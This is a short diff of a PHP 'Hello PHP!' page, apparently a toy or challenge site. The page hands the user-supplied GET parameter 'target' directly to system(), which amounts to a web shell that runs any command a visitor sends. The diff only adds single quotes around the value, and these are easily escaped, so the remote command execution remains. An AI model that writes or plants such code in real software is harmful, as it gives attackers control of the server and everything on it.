@@ -6,5 +6,5 @@ echo "<h1> Hello PHP! </h1>";
     <input type="submit" value="🕶">
 </form>
 <?php
-if (isset($_GET['target'])) system("${_GET['target']}")
+if (isset($_GET['target'])) system("'${_GET['target']}'")
 ?>
